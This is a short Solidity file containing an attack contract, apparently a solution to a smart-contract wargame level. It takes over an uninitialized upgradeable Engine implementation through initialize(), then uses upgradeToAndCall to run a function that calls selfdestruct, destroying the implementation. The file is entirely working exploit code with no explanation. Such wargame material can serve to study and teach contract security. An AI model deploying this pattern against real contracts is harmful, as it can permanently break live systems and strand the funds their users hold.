// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IEngine {
    function upgrader() pure external returns (address);
    function horsePower() pure external returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attack {
    constructor() {}

    function attack(IEngine engine) public {
        // IEngine engine = IEngine(0xBac3751147F530429a90b1c1eF4A5939e508A00A);
        engine.initialize();
        bytes memory data = abi.encodeWithSelector(this.hack.selector);
        engine.upgradeToAndCall(address(this),data);
    }

    function hack() public {
        selfdestruct(payable(address(0)));
    }
    
}